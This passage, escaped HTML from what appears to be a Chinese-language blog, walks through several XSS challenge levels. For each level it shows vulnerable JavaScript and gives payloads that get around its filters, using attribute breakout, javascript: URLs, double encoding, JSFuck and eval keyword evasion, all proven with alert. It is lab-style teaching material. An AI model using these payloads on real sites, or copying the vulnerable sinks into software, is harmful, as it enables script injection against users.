class=&#34;line&#34;&gt;eval([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],&amp;#x27;aaaaa&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(2) [&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//eval没有tostring方法，会返回数组形式的第一个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果eval的参数不是字符串，那么会原样返回。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&amp;quot;;alert(1)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1&amp;quot;,alert(1)//&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jeff=&amp;quot;-alert(1)-&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在js中-两边都是表达式，则可以执行代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;先闭合Ma name 1&amp;quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;da-wey&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#da-wey&#34;&gt;#&lt;/a&gt; da-wey&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div id=&amp;quot;uganda&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let wey = (new URL(location).searchParams.get(&amp;#x27;wey&amp;#x27;) || &amp;quot;do you know da wey?&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wey = wey.replace(/[&amp;lt;&amp;gt;]/g, &amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uganda.innerHTML = `&amp;lt;input type=&amp;quot;text&amp;quot; placeholder=&amp;quot;$&amp;#123;wey&amp;#125;&amp;quot; class=&amp;quot;form-control&amp;quot;&amp;gt;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?wey=1&amp;quot; onfocus=alert(1) autofocus//&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ricardo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ricardo&#34;&gt;#&lt;/a&gt; ricardo&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=&amp;quot;ricardo&amp;quot; method=&amp;quot;GET&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input name=&amp;quot;milos&amp;quot; type=&amp;quot;text&amp;quot; class=&amp;quot;form-control&amp;quot; placeholder=&amp;quot;True&amp;quot; value=&amp;quot;True&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ricardo.action = (new URL(location).searchParams.get(&amp;#x27;ricardo&amp;#x27;) || &amp;#x27;#&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setTimeout(_ =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ricardo.submit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, 2000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ricardo=javascript:alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;效果类似于这样:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form id=&amp;quot;ricardo&amp;quot; method=&amp;quot;GET&amp;quot; action=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input name=&amp;quot;milos&amp;quot; type=&amp;quot;text&amp;quot; class=&amp;quot;form-control&amp;quot; placeholder=&amp;quot;True&amp;quot; value=&amp;quot;True&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;submit&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ah-thats-hawt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ah-thats-hawt&#34;&gt;#&lt;/a&gt; Ah That’s Hawt&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h2 id=&amp;quot;will&amp;quot;&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    smith = (new URL(location).searchParams.get(&amp;#x27;markassbrownlee&amp;#x27;) || &amp;quot;Ah That&amp;#x27;s Hawt&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    smith = smith.replace(/[\(\`\)\\]/g, &amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    will.innerHTML = smith&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;过滤了()`\  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;先html实体，在url编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者两次url编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;markassbrownlee=&amp;lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;markassbrownlee=&amp;lt;a href=&amp;quot;javascript:alert%25281%2529&amp;quot;&amp;gt;a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;href中js可以解析url编码,%28 %29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ligma&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ligma&#34;&gt;#&lt;/a&gt; Ligma&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==&#34;&gt;http://www.jsfuck.com/&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;balls = (new URL(location).searchParams.get(&amp;#x27;balls&amp;#x27;) || &amp;quot;Ninja has Ligma&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;balls = balls.replace(/[A-Za-z0-9]/g, &amp;#x27;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(balls)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jsfuck 注意编码，url中需要使用URL编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;false       =&amp;gt;  ![]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;true        =&amp;gt;  !![]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;undefined   =&amp;gt;  [][[]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NaN         =&amp;gt;  +[![]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0           =&amp;gt;  +[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1           =&amp;gt;  +!+[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2           =&amp;gt;  !+[]+!+[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10          =&amp;gt;  [+!+[]]+[+[]]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Array       =&amp;gt;  []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Number      =&amp;gt;  +[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;String      =&amp;gt;  []+[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Boolean     =&amp;gt;  ![]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Function    =&amp;gt;  [][&amp;quot;filter&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval        =&amp;gt;  [][&amp;quot;filter&amp;quot;][&amp;quot;constructor&amp;quot;]( CODE )()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;window      =&amp;gt;  [][&amp;quot;filter&amp;quot;][&amp;quot;constructor&amp;quot;](&amp;quot;return this&amp;quot;)()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;mafia&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mafia&#34;&gt;#&lt;/a&gt; mafia&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mafia = (new URL(location).searchParams.get(&amp;#x27;mafia&amp;#x27;) || &amp;#x27;1+1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mafia = mafia.slice(0, 50)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mafia = mafia.replace(/[\`\&amp;#x27;\&amp;quot;\+\-\!\\\[\]]/gi, &amp;#x27;_&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mafia = mafia.replace(/alert/g, &amp;#x27;_&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(mafia)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(17795081..toString(36))(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;原理：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17795081是parseInt(&amp;quot;alert&amp;quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;quot;&amp;quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36 = 10 + 26    10个数字+26个字母&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alert中最大的是t，进制数为30，因此必须使用&amp;gt;=30的进制数才能表示t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;转换时使用thatNumber.toString(radix)函数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;前一篇prompt(1)详细解释过了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(location.hash.slice(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(location.hash.slice(1))#alert(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;但这种方式需要user interaction&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;原理：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url.href = &amp;#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;console.log(url.hash);      // #search-results-close-container&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload3：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Function(/ALERT(1337)/.source.toLowerCase())()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;利用构造函数&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;area-51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#area-51&#34;&gt;#&lt;/a&gt; Area 51&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;div id=&amp;quot;pwnme&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var input = (new URL(location).searchParams.get(&amp;#x27;debug&amp;#x27;) || &amp;#x27;&amp;#x27;).replace(/[\!\-\/\#\&amp;amp;\;\%]/g, &amp;#x27;_&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var template = document.createElement(&amp;#x27;template&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    template.innerHTML = input;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pwnme.innerHTML = &amp;quot;&amp;lt;!-- &amp;lt;p&amp;gt; DEBUG: &amp;quot; + template.outerHTML + &amp;quot; &amp;lt;/p&amp;gt; --&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;分析：过滤 !-/#&amp;amp;;% 全部被替换为_&lt;/span&gt;&lt;br&gt;&lt;span 